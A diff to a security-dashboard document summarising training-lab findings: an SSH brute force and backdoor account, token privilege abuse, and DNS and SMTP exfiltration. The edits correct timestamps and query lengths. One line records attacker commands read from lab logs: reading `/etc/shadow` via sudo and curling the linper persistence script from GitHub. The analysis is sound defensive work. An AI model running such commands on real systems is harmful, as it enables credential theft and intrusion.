@@ -156,7 +156,7 @@ This panel focuses on authenticating entities and detecting abnormal volumetric 
     - `admin`: 10 failed attempts
     - `backup`: 9 failed attempts
     - `root`: 6 failed attempts
-  - *Compromise Outcome:* Adversary successfully authenticated as `root` via password login at timestamp `06:19:54 UTC`, generating critical alert `BRUTUS-SSH-SUCCESS-001`.
+- *Compromise Outcome:* Adversary successfully authenticated as `root` via password login at timestamp **`06:32:44 UTC`** (Session 37 on `pts/1`). Note that the earlier timestamp `06:19:54 UTC` in `auth.log` corresponds to the legitimate administrator root login from IP `203.101.190.9` prior to the brute-force attack.
 - **Chart Representation:** Interactive horizontal/vertical bar chart rendering username failure frequencies, paired with source IP threat velocity indicators.
 
 ---
@@ -169,7 +169,7 @@ This panel tracks unauthorized elevation of system privileges, access token tamp
 - **Observed Adversary Activity:**
   - *Windows Token Allocation (Task 3):* Windows Security Event ID 4672 recorded sensitive privilege assignment on `LAB-WIN01` allocating `SeDebugPrivilege`, `SeTcbPrivilege`, and `SeAssignPrimaryTokenPrivilege` to non-admin user `student` via process `consent.exe`.
   - *Linux Backdoor Provisioning (HTB Brutus):* Following SSH root compromise, adversary executed `useradd` creating an unauthorized local account named `cyberjunkie` (Event `BRUTUS-BACKDOOR-001`, MITRE T1136.001).
-  - *Sudo Elevation Abuse (HTB Brutus):* Adversary executed `sudo` commands from `cyberjunkie` session to invoke `/bin/bash` with root UID 0 (Event `BRUTUS-SUDO-001`, MITRE T1548.003).
+- *Sudo Elevation Abuse (HTB Brutus):* Adversary executed administrative commands via `sudo` from the `cyberjunkie` session (Session 49), running `/usr/bin/cat /etc/shadow` and `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` to harvest credentials and stage an enumeration script (Event `BRUTUS-SUDO-001`, MITRE T1548.003).
 - **Chart Representation:** Doughnut chart breaking down elevation vectors (`Access Token Manipulation`, `Backdoor Account Creation`, `Sudo Command Elevation`).
 
 ---
@@ -180,9 +180,9 @@ This panel isolates unauthorized outbound data transfers that evade perimeter eg
 
 - **Threat Context:** Adversaries commonly route stolen data through DNS tunneling or external mail transport agents to blend with legitimate outbound traffic.
 - **Observed Adversary Activity:**
-  - *DNS Tunneling Query Length (Task 2):* Workstation `CORP-WKSTN05` generated anomalous DNS requests with label lengths exceeding threshold: `a8f92bd17c44e61f90ab3d7e.example.com` (length 37) and `f72d91ab84e06c35c7a1b902.example.com` (length 36).
-  - *DNS TXT Tunneling Payload (Task 3):* Sysmon Event ID 22 on `LAB-SRV01` logged high-entropy TXT query `dGVzdC1kYXRhLWV4ZmlsdHJhdGlvbi1zYW1wbGUtMDAx.exfil.training.lab` (length 68) transmitting base64-encoded test data to destination `192.0.2.50`.
-  - *Periodic SMTP Exfiltration (HawkEye Labs 1 & 4):* Compromised endpoint `Beijing-5cd1-PC` (`10.4.10.132`) initiated encrypted SMTP sessions on port 587 to mail server `23.229.162.69` (`mail.winlogistics.in`). Keylogger password archives were submitted in recurring bursts at **approximately 10-minute intervals** (604–605 seconds).
+- *DNS Tunneling Query Length (Task 2):* Workstation `CORP-WKSTN05` generated anomalous DNS requests with query lengths exceeding threshold (≥ 35 chars): `a8f92bd17c44e61f90ab3d7e.example.com` (length 36, subdomain 24 chars) and `f72d91ab84e06c35c7a1b902.example.com` (length 36, subdomain 24 chars). (Note: Event 7 in `sample-events.jsonl` contains an off-by-one metadata field `query_length: 37`, while the string geometry is 36 characters).
+- *DNS TXT Tunneling Payload (Task 3):* Sysmon Event ID 22 on `LAB-SRV01` logged high-entropy TXT query `dGVzdC1kYXRhLWV4ZmlsdHJhdGlvbi1zYW1wbGUtMDAx.exfil.training.lab` (length 63 characters; 44-character Base64 payload subdomain) transmitting test data to destination `192.0.2.50`.
+- *Periodic SMTP Exfiltration (HawkEye Labs 1 & 4):* Compromised endpoint `Beijing-5cd1-PC` (`10.4.10.132`) initiated unencrypted cleartext SMTP sessions on port 587 to mail server `23.229.162.69` (queried domain: `macwinlogistics.in`; banner hostname: `p3plcpnl0413.prod.phx3.secureserver.net`). Keylogger password archives were submitted in recurring cleartext bursts at **approximately 10-minute intervals** (604–606 seconds).
 - **Chart Representation:** Bar and line metrics displaying query length distribution and recurring exfiltration bursts across destination IP channels.
 
 ---
